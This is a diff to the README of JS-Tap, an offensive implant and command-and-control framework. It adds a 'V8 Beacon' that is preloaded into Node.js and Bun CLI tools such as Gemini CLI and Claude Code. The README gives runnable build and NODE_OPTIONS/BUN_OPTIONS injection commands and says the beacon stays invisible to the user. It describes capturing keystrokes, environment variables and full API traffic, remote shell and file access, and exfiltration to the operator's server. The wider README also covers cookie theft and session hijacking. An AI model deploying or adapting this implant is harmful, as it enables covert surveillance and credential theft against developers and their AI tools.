@@ -43,7 +43,7 @@ Make sure you review the configuration section below carefully before using on a
 
 ## Architecture Overview
 
-JS-Tap has four beacon/agent types that connect to the same server:
+JS-Tap has five beacon/agent types that connect to the same server:
 
 | Beacon Type | What It Is | How It Gets There |
 |---|---|---|
@@ -51,8 +51,9 @@ JS-Tap has four beacon/agent types that connect to the same server:
 | **BEX Beacon** | A browser extension (Chrome MV3 / Firefox MV2). Monitors all browsing activity, captures cookies (including httpOnly), localStorage, sessionStorage, and request headers. Can inject DOM Beacons into specific domains on command. | Installed in the target's browser (social engineering, physical access, policy push, etc.). |
 | **Sidecar** | A native Go binary that runs on the target's OS. Provides file system browsing, file reading, and command execution. | Installed alongside the BEX Beacon via native messaging. Requires the BEX Beacon to relay commands. |
 | **Atom Beacon** | A dual-layer implant for Electron desktop applications. Injects a main-process agent (Node.js runtime) + renderer payloads into all app windows. Combines browser-level data collection with host-level OS access — no separate binary needed. | Patched into the target Electron app's ASAR archive (or unpacked app directory) using `atomize.py`. |
+| **V8 Beacon** | A JavaScript agent for Node.js and Bun CLI applications (Gemini CLI, Claude Code, etc.). Intercepts all HTTP/Fetch network calls, captures keystrokes, and provides file system and shell access. Zero dependencies. | Injected via environment variable: `NODE_OPTIONS="--require"` (Node.js) or `BUN_OPTIONS="--preload"` (Bun). No app patching needed. |
 
-All four report back to the same JS-Tap server portal, where loot is viewed and C2 commands are issued.
+All five report back to the same JS-Tap server portal, where loot is viewed and C2 commands are issued.
 
 The portal also includes two session-cloning tools:
 
@@ -72,6 +73,8 @@ The portal also includes two session-cloning tools:
 4. **Browser Proxy for live browsing:** The operator configures their browser to use the JS-Tap proxy and all HTTP/HTTPS traffic is routed through the victim's browser in real time. The proxy performs MITM TLS termination (with an auto-generated CA) so the operator can browse HTTPS sites. With per-domain credential spoofing enabled, the victim's cookies and auth headers are injected into requests, giving the operator an authenticated session from the victim's IP address.
 
 5. **Atom Beacon for Electron apps:** The `atomize.py` patcher modifies an Electron app's ASAR archive to inject the Atom Beacon agent. On launch, the agent registers with the JS-Tap server, begins encrypted C2 communication, and automatically injects renderer payloads into every BrowserWindow the app creates. The main process agent provides native OS access (file system, command execution) while the renderer payloads collect DOM-level data (keystrokes, inputs, forms, cookies, storage, network calls). Because it runs inside the Electron main process with full Node.js access, it doesn't need a separate sidecar binary — file browsing, file reading, and shell commands are built in.
+
+6. **V8 Beacon for CLI tools:** The V8 Beacon targets Node.js and Bun-based CLI applications. Set an environment variable (`NODE_OPTIONS` or `BUN_OPTIONS`) and the beacon loads before the app's own code — no patching or modification of the target app is required. It monkey-patches `http.request`, `https.request`, `fetch`, and `http2.connect` to intercept all network traffic, hooks `process.stdin` for keystroke capture, and provides file browsing and shell execution via the C2 channel. CLI tools that spawn child processes (e.g. Gemini CLI spawns itself as a child for the interactive session) are handled automatically — the child inherits the parent's session keys and shares the same logical client in the portal. Cross-runtime subprocess filtering prevents Bun apps' Node.js utility subprocesses from registering as separate clients.
 
 
 ## Data Collected
@@ -140,6 +143,17 @@ Note: ability to receive copies of XHR and Fetch API calls works in trap mode. I
 * Fetch API calls (method, URL, headers, request body, response body, status)
 
 
+### V8 Beacon (Node.js / Bun CLI Apps)
+* Network interception — all HTTP, HTTPS, Fetch, and HTTP/2 calls with full request/response bodies (including SSE streaming), headers, and status codes
+* Keystroke capture from `process.stdin` (buffered into readable strings, flushed every 2 seconds or on Enter)
+* Environment variables snapshot on init
+* Process info (argv, cwd, pid, title, Node/Bun version)
+* File system access (directory listings, file reading) — native, no sidecar needed
+* Command execution (shell commands with stdout/stderr/exit code) — native
+* Host information (hostname, platform, architecture, username, home directory)
+* Automatic gzip decompression of compressed API responses
+
+
 ## Operating Modes
 The DOM Beacon payload has two modes of operation. Whether the mode is **trap** or **implant** is set in the **initGlobals()** function, search for the **window.taperMode** variable.
 #### Trap Mode
@@ -188,6 +202,24 @@ The Atom Beacon uses the same encrypted communication protocol as the BEX Beacon
 - **Cookie capture** — Reads all cookies (including httpOnly) from the Electron session via `session.cookies.get()`.
 
 See [Atom Beacon (Patching Electron Apps)](#atom-beacon-patching-electron-apps) below for setup and usage.
+
+#### V8 Beacon (Node.js / Bun CLI Implant)
+The **V8 Beacon** is an implant for Node.js and Bun-based command-line applications. Unlike the Atom Beacon which requires patching an app's ASAR archive, the V8 Beacon injects via environment variables — no modification of the target application is needed.
+
+**Supported runtimes:**
+- **Node.js** — `export NODE_OPTIONS="--require /path/to/v8-beacon.js"` (tested with Gemini CLI and other Node.js tools)
+- **Bun** — `export BUN_OPTIONS="--preload /path/to/v8-beacon.js"` (tested with Claude Code)
+
+The beacon uses the same encrypted communication protocol as the BEX and Atom Beacons (AES-GCM encryption over a single endpoint, with RSA-OAEP key exchange). It registers as client type `v8-beacon` and appears in the **Nodes** view in the portal.
+
+**Key capabilities:**
+- **Network interception** — Monkey-patches `http.request`, `https.request`, `globalThis.fetch`, and `http2.connect` to capture all outgoing network calls with full request/response bodies, headers, and status codes. SSE streaming responses (used by AI APIs like Anthropic's Messages API and Google's Gemini API) are captured by teeing the response stream. Gzip-compressed responses are automatically decompressed.
+- **Keystroke capture** — Hooks `process.stdin` at multiple layers (push, emit, tty.ReadStream, readline) to capture user input. Keystrokes are buffered into readable strings and flushed every 2 seconds (or immediately on Enter).
+- **Native OS access** — File browsing, file reading, and shell command execution are built into the agent, using the same portal UI as the Atom Beacon and BEX Sidecar.
+- **Subprocess session sharing** — CLI tools that spawn themselves as child processes (e.g. Gemini CLI) automatically share the parent's session. The child inherits encryption keys via environment variables and all events appear under a single client in the portal.
+- **Cross-runtime filtering** — When a Bun app (like Claude Code) spawns Node.js utility subprocesses, the beacon detects the runtime mismatch and skips the child to prevent ghost clients.
+
+See [V8 Beacon (Node.js / Bun CLI Apps)](#v8-beacon-nodejs--bun-cli-apps) below for setup and usage.
 
 ## Screenshotting Systems
 JS-Tap employs three distinct methods for capturing screenshots:
@@ -598,6 +630,107 @@ Auto-capture uses debounced triggers — for SPA navigation, the screenshot is t
 The Tools panel badge shows **Built-in** for Atom Beacon clients (since OS access is native to the agent, not dependent on an external sidecar binary).
 
 
+### V8 Beacon (Node.js / Bun CLI Apps)
+
+The V8 Beacon implant is injected into Node.js and Bun CLI applications via environment variables. No patching or modification of the target application is required.
+
+#### Building the Beacon
+
+```bash
+cd v8-beacon
+python3 v8ize.py --server https://10.0.0.1:8444 --tag gemini
+```
+
+Options:
+
+| Flag | Description |
+|---|---|
+| `--server URL` | JS-Tap server URL (required) |
+| `--tag TAG` | Client tag, shown in the portal (default: `v8`) |
+| `--output PATH` | Output file path (default: `./v8-beacon.js`) |
+
+This generates a self-contained `v8-beacon.js` file with the server URL and tag baked in.
+
+#### Injecting the Beacon
+
+**For Node.js applications** (Gemini CLI, OpenCode, custom Node.js tools, etc.):
+```bash
+export NODE_OPTIONS="--require /path/to/v8-beacon.js"
+gemini          # or any Node.js CLI tool
+```
+
+**For Bun applications** (Claude Code, etc.):
+```bash
+export BUN_OPTIONS="--preload /path/to/v8-beacon.js"
+claude          # or any Bun-based CLI tool
+```
+
+You can set both environment variables simultaneously to cover both runtimes:
+```bash
+export NODE_OPTIONS="--require /path/to/v8-beacon.js"
+export BUN_OPTIONS="--preload /path/to/v8-beacon.js"
+```
+
+The beacon loads before the application's own code and begins instrumenting the runtime. The target application runs normally — the beacon is invisible to the user.
+
+#### How It Works
+
+```
+Target CLI Application (e.g. claude, gemini)
+    │ --require / --preload loads v8-beacon.js
+    ▼
+V8 Beacon Agent (same process)
+    │ Registers with JS-Tap server
+    │ RSA-OAEP key exchange → AES-GCM encrypted channel
+    ▼
+Heartbeat Loop (jittered interval)
+    ├── Poll for tasks (shell commands, file browser, etc.)
+    ├── Flush captured data (network calls, keystrokes)
+    ├── Exfiltrate queued data (encrypted, single endpoint)
+    └── Report status (host info, capabilities)
+
+Network Hooks (automatic)
+    ├── http.request / https.request (monkey-patched)
+    ├── globalThis.fetch (monkey-patched)
+    ├── http2.connect (monkey-patched)
+    └── Module._load intercept for node-fetch
+
+Stdin Hooks (automatic)
+    ├── process.stdin.push / emit
+    ├── tty.ReadStream.prototype.push
+    └── readline.createInterface
+```
+
+#### Subprocess Handling
+
+Some CLI tools spawn themselves as child processes. For example, Gemini CLI runs authentication in the parent process, then spawns a child `node gemini` process for the interactive session (where the actual API calls happen).
+
+The V8 Beacon handles this automatically:
+- The parent sets `__V8_BEACON_ACTIVE` and `__V8_BEACON_RUNTIME` environment variables
+- Child processes in the **same runtime** inherit the parent's session (UUID and encryption keys via `__V8_BEACON_UUID`, `__V8_BEACON_SENDKEY`, `__V8_BEACON_RECVKEY`)
+- Child processes in a **different runtime** (e.g. a Bun app spawning a Node.js utility) are skipped
+- Build tools and package managers (`npm`, `npx`, `yarn`, `tsc`, `eslint`, etc.) are always skipped
+
+This means a Gemini CLI session with parent + child processes appears as a single client in the portal with all events unified.
+
+#### Using the Tools Panel (V8 Beacon)
+
+When a V8 Beacon client is selected in the portal (under the **Nodes** tab), the **Tools** panel provides:
+
+**File Browser tab** — Browse the target's file system and read files, identical to the BEX Sidecar and Atom Beacon file browsers.
+
+**Shell tab** — Execute commands on the target via Node.js `child_process`.
+
+The Tools panel badge shows **Built-in** (OS access is native to the agent).
+
+#### Tested Applications
+
+| Application | Runtime | Status |
+|---|---|---|
+| Gemini CLI | Node.js | Full network intercept (including `streamGenerateContent` SSE), keylogging, file/shell access |
+| Claude Code | Bun 1.3.10 | Full network intercept (including `/v1/messages` SSE streaming), keylogging, file/shell access |
+
+
 ## Configuration
 
 ### JS-Tap Server Configuration
@@ -824,10 +957,12 @@ window.monkeyPatchAPIs = true;
 Login with the admin credentials provided by the server script on startup (also saved to `adminCreds.txt`).
 
 ### Client Management
-Clients show up on the left, grouped by type (**Apps** vs **Browsers**). Use the toggle buttons at the top of the client list to switch between views.
+Clients show up on the left, grouped by type. Use the toggle buttons at the top of the client list to switch between views.
 
-* **Apps** — DOM Beacon clients (from telemlib.js payloads) and Atom Beacon clients (from patched Electron apps)
+* **Apps** — DOM Beacon clients (from telemlib.js payloads)
 * **Browsers** — BEX Beacon clients
+* **Electrons** — Atom Beacon clients (from patched Electron apps)
+* **Nodes** — V8 Beacon clients (from Node.js/Bun CLI apps)
 
 Selecting a client will show a time series of their events (loot) on the right. If you filter the list (e.g. switching from Apps to Browsers), the currently selected loot view will dim and turn grayscale to indicate it is "background" data.
 
@@ -835,7 +970,7 @@ When in the **Browsers** view, the detail column header shows a **Loot / Tools**
 * **Loot** tab — Domain cards showing visited domains, injection controls, and per-domain credential spoofing toggles.
 * **Tools** tab — Browser Proxy panel (always visible) and Sidecar panel (collapsible, if the beacon supports it).
 
-Atom Beacon clients (in the **Apps** view) also have a **Loot / Tools** toggle. Their Tools panel provides built-in file browsing, shell access, and screenshot controls without requiring a separate sidecar binary.
+Atom Beacon clients (in the **Electrons** view) and V8 Beacon clients (in the **Nodes** view) also have a **Loot / Tools** toggle. Their Tools panel provides built-in file browsing and shell access without requiring a separate sidecar binary. Atom Beacons additionally have screenshot controls.
 
 **BEX Beacons (Browsers)** can be expanded to see all domains they have visited. You can trigger DOM Beacon injection from the domain list. BEX Beacon cards in the sidebar will display a summary of any DOM Beacons they have successfully spawned.
 
@@ -868,7 +1003,7 @@ The BEX Beacon captures cookies (including httpOnly), localStorage, sessionStora
 #### Generating a JS-Tap Ticket
 
 1. In the JS-Tap portal, select a BEX Beacon client and expand its domain list.
-2. Click the **Clone Ticket** button on the domain card you want to clone.
+2. Click the **Session Ticket** button on the domain card you want to clone.
 3. The ticket is copied to your clipboard as a base64-encoded string.
 
 A ticket contains:
@@ -916,7 +1051,7 @@ The popup shows all active tickets with badge counts for cookies, headers, local
 
 ### Browser Proxy
 
-The Browser Proxy lets you route your browser traffic through the victim's browser in real time. Unlike JS-Tap Tickets (which clone a snapshot of session data), the proxy provides a live channel — requests are fetched from the victim's browser and IP address, so the target site sees the victim's cookies, IP, and TLS fingerprint.
+The Browser Proxy lets you route your browser traffic through the victim's browser in real time. Unlike JS-Tap Session Tickets (which clone a snapshot of session data), the proxy provides a live channel — requests are fetched from the victim's browser and IP address, so the target site sees the victim's cookies, IP, and TLS fingerprint.
 
 #### How It Works
 
@@ -944,7 +1079,7 @@ While the proxy is active, you can click **Proxy Ticket** to generate a JS-Tap C
 
 ### Using the Sidecar / Tools Panel
 
-When a BEX Beacon client has the Sidecar connected, the **Tools** tab will show a **Sidecar** panel (collapsed by default, below the Browser Proxy panel). Atom Beacon clients show the same panel as **Tools** with a **Built-in** badge (since OS access is native to the agent). The panel has tabs:
+When a BEX Beacon client has the Sidecar connected, the **Tools** tab will show a **Sidecar** panel (collapsed by default, below the Browser Proxy panel). Atom Beacon and V8 Beacon clients show the same panel as **Tools** with a **Built-in** badge (since OS access is native to the agent). The panel has tabs:
 
 #### File Browser Tab
 - The file browser automatically lists the user's home directory when the panel first loads
@@ -1064,6 +1199,10 @@ JS-Tap/
 │   └── payload/
 │       ├── atom-agent.js   # Main process agent (C2, encryption, OS access, screenshots)
 │       └── atom-telemlib.js # Renderer payload (keylogging, DOM capture, network interception)
+├── v8-beacon/              # Node.js / Bun CLI implant
+│   ├── v8ize.py            # Build script (template variable replacement)
+│   └── payload/
+│       └── v8-agent.js     # V8 Beacon agent (network hooks, stdin capture, C2)
 ├── sidecar/                # Native messaging Go binary
 │   ├── main.go             # Message loop (native messaging protocol)
 │   ├── commands.go         # Command handlers (list_dir, read_file, exec_cmd)
